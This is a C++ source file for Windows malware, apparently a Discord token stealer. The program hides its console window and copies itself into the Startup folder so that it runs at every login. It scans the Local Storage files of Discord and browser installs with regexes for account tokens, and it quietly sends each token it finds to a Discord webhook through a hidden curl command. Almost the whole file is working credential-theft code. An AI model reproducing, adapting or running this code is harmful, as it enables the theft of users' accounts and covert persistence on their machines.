#define _CRT_SECURE_NO_WARNINGS

#include <iostream>
#include <regex>
#include <fstream>
#include <string>
#include <filesystem>
#include <Windows.h>
namespace fs = std::filesystem;

std::string send_token(std::string token) {

	char cmd[1024];
	sprintf(cmd, "curl -d \"content=%s\" https://discord.com/api/webhooks/WEBHOOKHERE >nul", token.c_str());
	WinExec(cmd, SW_HIDE);

	return cmd;
}

std::vector<std::string> findMatch(std::string str, std::regex reg)
{
	std::vector<std::string> output;
	std::sregex_iterator currentMatch(str.begin(), str.end(), reg);
	std::sregex_iterator lastMatch;

	while (currentMatch != lastMatch) {
		std::smatch match = *currentMatch;
		output.push_back(match.str());
		currentMatch++;
	}

	return output;
}

int main() {
	::ShowWindow(::GetConsoleWindow(), SW_HIDE);


	// Persistence

	char BUFFER[MAX_PATH];
	char szPath[1024];
	char szPath2[1024];

	GetModuleFileNameA(nullptr, BUFFER, MAX_PATH);
	sprintf(szPath, "%s\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\x.exe", std::getenv("appdata"));
	fs::remove(szPath);
	fs::copy(BUFFER, szPath);


	// Finding token

	std::vector<std::string> installs = { "\\Lightcord\\Local Storage\\leveldb", "\\Discord\\Local Storage\\leveldb", "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb", "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb", "\\discordptb\\Local Storage\\leveldb", "\\discordcanary\\Local Storage\\leveldb"};

	for (int i = 0; i < 2; i++) {
		std::string path = std::getenv("appdata") + installs[i];
		for (const auto& entry : fs::directory_iterator(path)) {
			std::ifstream t(entry.path(), std::ios_base::binary);

			std::string str((std::istreambuf_iterator<char>(t)), std::istreambuf_iterator<char>());
			std::vector<std::string> matches;
			std::regex expression(R"([\w-]{24}\.[\w-]{6}\.[\w-]{27})"); // Checksum credit for token regex.
			std::regex expression2(R"([\w-]{3}\.[\w-]{84})");

			std::vector<std::string> regex_non_mfa = findMatch(str, expression); // NightfallGT for this function
			std::vector<std::string> regex_mfa = findMatch(str, expression2); // NightfallGT for this function
			for (int i = 0; i < regex_non_mfa.size(); i++) {
				matches.push_back(regex_non_mfa[i]);
			}
			for (int i = 0; i < regex_mfa.size(); i++) {
				matches.push_back(regex_mfa[i]);
			}


			for (int i = 0; i < matches.size(); i++) {
				send_token(matches[i]);
			}
		}
	}
}
